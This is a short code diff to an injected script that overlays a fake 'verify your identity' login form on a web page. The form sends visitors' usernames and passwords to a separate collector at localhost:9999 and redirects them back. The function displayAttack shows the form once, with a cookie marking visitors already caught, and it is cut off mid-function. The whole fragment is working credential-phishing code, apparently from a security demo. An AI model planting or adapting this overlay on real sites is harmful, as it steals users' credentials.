@@ -1,26 +1,19 @@
 <script>
-    function getParameterByName(name, url) {
-        if (!url) url = window.location.href;
-        name = name.replace(/[\[\]]/g, "\\$&");
-        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)");
-        results = regex.exec(url);
-        if (!results) return null;
-        if (!results[2]) return '';
-        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    function markVisited() {
+        document.cookie = 1;
     }
     function getLoginPane() {
         var html = '<h1>Please login to verify your identity:</h1><br/><form action=\'http://localhost:9999\' method=\'POST\'>';
         html += '<input type=\'text\' name=\'username\' placeholder=\'Enter your username...\'/>';
         html += '<input type=\'password\' name=\'password\' placeholder=\'Enter your password...\'/>';
-        html += '<input type=\'submit\' placeholder=\'Login\'/>';
+        html += '<input type=\'submit\' onclick=\'markVisited()\' placeholder=\'Login\'/>';
         html += '<input type=\'hidden\' name=\'redirect\' value=\''+window.location.href+'\'/>';        
         html += '</form>';
         return html;
     }
 
     function displayAttack() {
-        if (getParameterByName('x') == 1 || document.cookie == 1) {
-            document.cookie = 1;
+        if (document.cookie == 1) {
             return;
         }        
         var html = document.getElementById('htmlId');
